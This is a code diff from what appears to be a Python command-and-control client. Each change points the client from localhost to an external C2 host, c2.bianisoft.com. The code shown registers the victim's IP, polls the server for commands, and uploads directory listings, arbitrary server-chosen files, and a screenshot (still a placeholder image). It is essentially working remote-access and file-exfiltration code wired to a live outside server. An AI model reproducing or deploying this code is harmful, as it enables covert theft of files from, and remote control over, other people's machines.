@@ -37,7 +37,7 @@ def main():
     print("This is my IP :" + strMyIP)
 
     s = requests.Session()
-    r = s.put('http://127.0.0.1:8081/', params={'userID': strMyIP, 'commandID' : strMyIP,})
+    r = s.put('http://c2.bianisoft.com:8081/', params={'userID': strMyIP, 'commandID' : strMyIP,})
 
     while True:
         now = datetime.now()
@@ -45,7 +45,7 @@ def main():
 
         #Get the next command
         s = requests.Session()
-        r = s.get('http://127.0.0.1:8081/', params = {'userID': strMyIP})
+        r = s.get('http://c2.bianisoft.com:8081/', params = {'userID': strMyIP})
 
         if r.status_code != 200:
             #Server is offline
@@ -63,7 +63,7 @@ def main():
                 f.write(listing)
 
             files = {'file': open(os.getcwd() + "/listing-{}.txt".format(current_time), 'rb')}
-            r = requests.post('http://127.0.0.1:8081/',
+            r = requests.post('http://c2.bianisoft.com:8081/',
                               files=files,
                               params = {'userID': strMyIP,
                                         'commandID' : '1',
@@ -78,7 +78,7 @@ def main():
             strFile= strFile.replace("\n", "")
 
             files = {'file': open(strFile, 'rb')}
-            r = requests.post('http://127.0.0.1:8081/',
+            r = requests.post('http://c2.bianisoft.com:8081/',
                               files=files,
                               params = {'userID': strMyIP,
                                         'commandID' : '2',
@@ -89,7 +89,7 @@ def main():
                 #TODO, for now we use a fakeimage.png
             #send the file
             files = {'file': open(os.getcwd() + "/fakeScreenshot.png", 'rb')}
-            r = requests.post('http://127.0.0.1:8081/',
+            r = requests.post('http://c2.bianisoft.com:8081/',
                               files=files,
                               params = {'userID': strMyIP,
                                         'commandID' : '3',
